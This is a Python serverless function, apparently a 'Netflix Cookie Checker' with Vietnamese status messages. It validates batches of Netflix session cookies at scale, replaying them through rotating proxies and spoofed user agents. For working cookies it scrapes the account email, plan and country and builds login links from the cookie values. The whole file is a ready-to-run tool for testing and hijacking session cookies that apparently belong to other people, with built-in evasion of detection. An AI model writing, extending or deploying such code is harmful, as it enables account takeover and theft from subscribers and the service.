"""
Netflix Cookie Checker — Vercel Serverless Function
Python 3.12+ | Concurrent checking with ThreadPoolExecutor
Proxy support via PROXY_LIST environment variable
"""

from http.server import BaseHTTPRequestHandler
import json
import re
import base64
import os
import time
import random
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests as http_requests


# ──────────────────────────────────────────────
# Proxy Management
# ──────────────────────────────────────────────

def load_proxies() -> list[dict[str, str]]:
    """Load proxies from PROXY_LIST env var.
    Format: "ip:port,ip:port,user:pass@ip:port"
    """
    raw = os.environ.get("PROXY_LIST", "")
    if not raw.strip():
        return []
    proxies: list[dict[str, str]] = []
    for item in raw.split(","):
        item = item.strip()
        if not item:
            continue
        if "@" in item:
            auth, host = item.split("@", 1)
            proxy_url = f"http://{auth}@{host}"
        else:
            proxy_url = f"http://{item}"
        proxies.append({"http": proxy_url, "https": proxy_url})
    return proxies


PROXY_LIST: list[dict[str, str]] = load_proxies()

USER_AGENTS: list[str] = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 "
    "Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
]


def get_random_proxy() -> dict[str, str] | None:
    """Return a random proxy dict or None if no proxies configured."""
    return random.choice(PROXY_LIST) if PROXY_LIST else None


# ──────────────────────────────────────────────
# Cookie Checking Logic
# ──────────────────────────────────────────────

def _extract_account_details(text: str) -> dict[str, str]:
    """Extract Netflix account details from page HTML."""
    details: dict[str, str] = {}
    try:
        data_match = re.search(
            r"window\.__netflix\.reactContext\s*=\s*({.*?});",
            text,
            re.DOTALL,
        )
        if data_match:
            data = json.loads(data_match.group(1))
            user_info = data.get("models", {}).get("userInfo", {}).get("data", {})
            if not user_info:
                user_info = (
                    data.get("models", {})
                    .get("serverModel", {})
                    .get("data", {})
                    .get("userInfo", {})
                )
            details = {
                "email": user_info.get("email", ""),
                "membership": user_info.get("membershipStatus", ""),
                "plan": user_info.get("plan", {}).get("planName", ""),
                "country": user_info.get("countryOfSignup", ""),
            }
        else:
            email_m = re.search(r'"email"\s*:\s*"([^"]+)"', text)
            member_m = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', text)
            plan_m = re.search(r'"planName"\s*:\s*"([^"]+)"', text)
            country_m = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', text)
            details = {
                "email": email_m.group(1) if email_m else "",
                "membership": member_m.group(1) if member_m else "",
                "plan": plan_m.group(1) if plan_m else "",
                "country": country_m.group(1) if country_m else "",
            }
    except (json.JSONDecodeError, AttributeError, KeyError):
        pass
    return details


def _generate_api_token(cookie: str) -> dict:
    """Generate API token and direct links from cookie."""
    nid = re.search(r"NetflixId=([^;]+)", cookie)
    sid = re.search(r"SecureNetflixId=([^;]+)", cookie)
    if not (nid and sid):
        return {}
    payload = {
        "netflixId": nid.group(1),
        "secureNetflixId": sid.group(1),
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }
    token = (
        base64.b64encode(json.dumps(payload).encode())
        .decode()
        .replace("+", "-")
        .replace("/", "_")
        .rstrip("=")
    )
    return {
        "api_token": token,
        "direct_links": {
            "computer": {
                "name": "💻 Computer",
                "url": f"https://www.netflix.com/Login?apiToken={token}",
            },
            "mobile": {
                "name": "📱 Mobile",
                "url": f"https://www.netflix.com/Login?apiToken={token}&deviceType=mobile",
            },
            "tv": {
                "name": "📺 TV",
                "url": f"https://www.netflix.com/tv/login?apiToken={token}",
            },
        },
    }


def check_single_cookie(cookie: str, timeout: int = 20) -> dict:
    """Check a single Netflix cookie for validity.

    Returns a result dict with status, message, details, and api_tokens.
    """
    result: dict = {
        "status": "unknown",
        "message": "",
        "cookie": cookie,
        "details": {},
        "api_tokens": {},
    }
    try:
        session = http_requests.Session()
        proxy = get_random_proxy()
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": (
                "text/html,application/xhtml+xml,application/xml;"
                "q=0.9,image/webp,*/*;q=0.8"
            ),
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": cookie,
        }
        proxies = proxy if proxy else None

        # Step 1: Visit homepage to establish session
        session.get(
            "https://www.netflix.com/",
            headers=headers,
            timeout=timeout,
            allow_redirects=True,
            proxies=proxies,
        )
        time.sleep(random.uniform(0.2, 0.5))

        # Step 2: Visit account page
        response = session.get(
            "https://www.netflix.com/YourAccount",
            headers=headers,
            timeout=timeout,
            allow_redirects=True,
            proxies=proxies,
        )
        final_url = response.url

        # Check if redirected to login → cookie expired
        if "login" in final_url.lower():
            result["status"] = "invalid"
            result["message"] = "Cookie hết hạn"
            return result

        text = response.text
        markers = ("membershipStatus", "profiles", "gps")

        if any(marker in text for marker in markers):
            result["status"] = "valid"
            result["message"] = "Cookie hợp lệ"
            result["details"] = _extract_account_details(text)
            result["api_tokens"] = _generate_api_token(cookie)
        else:
            result["status"] = "error"
            result["message"] = "Không thể xác minh"

        return result

    except http_requests.exceptions.Timeout:
        result["status"] = "error"
        result["message"] = "Timeout kết nối"
        return result
    except http_requests.exceptions.ProxyError:
        result["status"] = "error"
        result["message"] = "Lỗi proxy"
        return result
    except http_requests.exceptions.ConnectionError:
        result["status"] = "error"
        result["message"] = "Lỗi kết nối"
        return result
    except Exception as exc:
        result["status"] = "error"
        result["message"] = str(exc)[:120]
        return result


# ──────────────────────────────────────────────
# Vercel Serverless Handler
# ──────────────────────────────────────────────

class handler(BaseHTTPRequestHandler):
    """POST /api/check — Check a batch of Netflix cookies."""

    def _send_json(self, status: int, data: dict | list) -> None:
        body = json.dumps(data, ensure_ascii=False).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self) -> None:
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_POST(self) -> None:
        try:
            content_length = int(self.headers.get("Content-Length", 0))
            raw_body = self.rfile.read(content_length)
            data = json.loads(raw_body)
        except (json.JSONDecodeError, ValueError):
            self._send_json(400, {"error": "Invalid JSON body"})
            return

        cookies_raw: str = data.get("cookies", "")
        timeout: int = min(int(data.get("timeout", 20)), 30)
        max_workers: int = min(int(data.get("workers", 4)), 6)

        if not cookies_raw.strip():
            self._send_json(200, {"results": []})
            return

        lines = [
            line.strip()
            for line in cookies_raw.split("\n")
            if line.strip() and "=" in line
        ]

        if not lines:
            self._send_json(200, {"results": []})
            return

        results: list[dict] = []

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_map = {
                executor.submit(check_single_cookie, cookie, timeout): idx
                for idx, cookie in enumerate(lines, 1)
            }
            for future in as_completed(future_map):
                idx = future_map[future]
                try:
                    result = future.result()
                    result["index"] = idx
                    results.append(result)
                except Exception as exc:
                    results.append(
                        {
                            "status": "error",
                            "message": str(exc)[:120],
                            "cookie": lines[idx - 1] if idx <= len(lines) else "",
                            "index": idx,
                            "details": {},
                            "api_tokens": {},
                        }
                    )

        results.sort(key=lambda r: r.get("index", 0))
        self._send_json(200, {"results": results})

    def log_message(self, format: str, *args) -> None:
        """Suppress default logging in serverless environment."""
        pass
